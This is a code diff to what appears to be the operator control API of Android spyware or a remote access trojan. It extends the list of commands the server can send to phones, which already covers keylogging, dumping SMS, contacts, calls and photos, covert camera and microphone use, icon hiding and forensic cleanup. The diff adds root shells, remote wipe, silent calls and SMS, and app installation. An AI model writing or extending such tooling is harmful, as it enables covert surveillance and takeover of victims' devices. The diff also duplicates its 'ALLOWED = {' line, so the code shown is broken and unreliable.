@@ -12,18 +12,22 @@ from .ws import hub
 router = APIRouter(prefix="/api/control", dependencies=[Depends(security.require_operator)])
 
 ALLOWED = {
+ALLOWED = {
     "locate_once", "locate_start", "locate_stop",
     "screen_start", "screen_stop", "screen_shot",
-    "tap", "swipe", "key", "text",
+    "tap", "swipe", "key", "text", "shell", "root_shell",
     "cam_front", "cam_back", "cam_stop",
     "mic_start", "mic_stop", "speaker_play",
-    "wallpaper_set", "media_push", "lock_screen",
+    "wallpaper_set", "media_push", "lock_screen", "lock_pin",
     "dump_contacts", "dump_sms", "dump_calls", "dump_gallery",
     "dump_notif", "dump_net", "dump_keylog", "dump_apps",
     "notif_start", "notif_stop", "keylog_start", "keylog_stop",
     "hide_icon", "show_icon", "ping", "info", "forensic_clean",
     "brightness", "volume", "vibrate", "toast", "open_url",
-    "delay_mode", "kill_self", "lock_pin",
+    "delay_mode", "kill_self", "reconnect",
+    "clipboard", "wifi_set", "data_set", "airplane",
+    "screen_on", "screen_off", "reboot", "reboot_recovery", "power_off", "wipe",
+    "dial", "call", "sms_send", "app_uninstall", "app_install", "write_settings",
 }
 
 
